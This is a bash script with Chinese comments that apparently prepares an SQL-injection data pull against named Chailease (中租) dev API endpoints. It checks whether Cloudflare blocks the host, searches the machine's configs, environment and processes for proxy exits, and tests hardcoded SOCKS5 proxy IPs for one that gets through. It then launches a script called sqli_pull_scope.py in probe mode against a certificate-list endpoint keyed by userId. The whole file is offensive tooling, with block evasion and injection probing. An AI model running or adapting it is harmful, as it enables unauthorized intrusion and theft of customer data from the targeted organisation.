#!/bin/bash
# precheck.sh — vps2 / 任意執行機的「出口與注入」自檢
# 目的：一次看完這台機器能不能直連中租、以及這台機器上有哪些可用的代理出口。
set -uo pipefail

UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36'
SIGN='https://mid-sign-dev.chailease.com.tw/api/MidSigApp/v1/GetCertList?userId=82878301'
FRONT='https://dev-member-center-frontstage-service.chailease.com.tw/Member/UserSiteList?phone=0000000000&countryNo=TW'

echo "==================== 1. 本機 IP ===================="
ip -4 addr show 2>/dev/null | grep -E 'inet ' || ifconfig 2>/dev/null | grep 'inet '
echo "--- 預設路由 ---"
ip route show default 2>/dev/null || netstat -rn 2>/dev/null | head -5

echo
echo "==================== 2. 目前出口 IP ===================="
for u in https://api.ipify.org https://ifconfig.me/ip; do
    printf '  %-28s -> ' "$u"
    curl -s --max-time 10 "$u" 2>/dev/null || echo "(失敗)"
    echo
done

echo
echo "==================== 3. 中租可達性 ===================="
for name in mid-sign member-center; do
    case "$name" in
        mid-sign)    url="$SIGN" ;;
        member-center) url="$FRONT" ;;
    esac
    code=$(curl -sk --max-time 20 -A "$UA" -o /tmp/pc_body -w '%{http_code}' "$url" 2>/dev/null)
    ray=$(grep -i '^cf-ray' /tmp/pc_body 2>/dev/null | head -1 | tr -d '\r')
    blocked=$(grep -c 'Attention Required\|you have been blocked' /tmp/pc_body 2>/dev/null)
    printf '  %-14s HTTP %-4s blocked=%-3s %s\n' "$name" "$code" "${blocked:-0}" "$ray"
done
if grep -q 'Attention Required\|you have been blocked' /tmp/pc_body 2>/dev/null; then
    echo "  => 這個出口被 Cloudflare 擋住；換出口後再跑抽取。"
fi

echo
echo "==================== 4. 這台機器上的代理出口線索 ===================="
echo "--- 監聽中的本地埠（常見代理埠）---"
ss -lntp 2>/dev/null | grep -E ':(1080|1081|108[0-9]{2}|9050|8118|3128|8888|6060)\b' \
  || netstat -lntp 2>/dev/null | grep -E ':(1080|108[0-9]{2}|9050|8118|3128|6060)\b' \
  || echo "  (無)"
echo "--- 環境變數中的 proxy ---"
env | grep -iE 'all_proxy|http_proxy|https_proxy|socks' || echo "  (無)"
echo "--- 設定檔裡的 proxy 線索 ---"
for f in /etc/environment /etc/profile /root/.bashrc /root/.profile /etc/wireguard/*.conf; do
    [ -f "$f" ] && grep -inE 'proxy|socks|endpoint' "$f" 2>/dev/null | sed "s|^|  [$f] |"
done
echo "--- 3proxy / gost / frpc 等代理行程 ---"
ps aux 2>/dev/null | grep -iE '3proxy|gost|frp|frpc|sing-box|xray|v2ray|wireguard|tailscale' | grep -v grep || echo "  (無)"
echo "--- WireGuard / Tailscale 介面 ---"
ip -br addr 2>/dev/null | grep -iE 'wg|tailscale|tun' || echo "  (無)"

echo
echo "==================== 5. 逐一支測試本機/已知代理 ===================="
CAND=""
for f in /etc/environment /root/.bashrc /root/.profile /etc/profile.d/*.sh; do
    [ -f "$f" ] && CAND="$CAND $(grep -ohE '(socks5h?://[^ \"'\'']+|[0-9]{1,3}(\.[0-9]{1,3}){3}:(1080|108[0-9]{2}|9050|6060))' "$f" 2>/dev/null)"
done
CAND="$CAND 127.0.0.1:1080 202.160.76.154:11085 202.160.76.156:11083 202.160.76.157:11082 202.160.76.165:11081 202.160.76.166:11086"
for px in $CAND; do
    case "$px" in *://*) url="$px";; *) url="socks5h://$px";; esac
    ipout=$(curl -s --max-time 8 --proxy "$url" https://api.ipify.org 2>/dev/null)
    cf=$(curl -sk --max-time 12 --proxy "$url" -A "$UA" -o /dev/null -w '%{http_code}' "$SIGN" 2>/dev/null)
    printf '  %-46s exit=%-16s mid-sign=%s\n' "$url" "${ipout:-?}" "${cf:-?}"
done

echo
echo "==================== 6. 注入點自檢（若上面 mid-sign 非 403）===================="
if [ -f sqli_pull_scope.py ]; then
    python3 sqli_pull_scope.py --probe 2>&1 | tail -20
else
    echo "  （找不到 sqli_pull_scope.py，略過；請把整包解壓後再跑）"
    echo "  若要手動確認注入，可直接試："
    echo "  curl -sk 'https://mid-sign-dev.chailease.com.tw/api/MidSigApp/v1/GetCertList?userId=82878301' | head -c 400"
fi
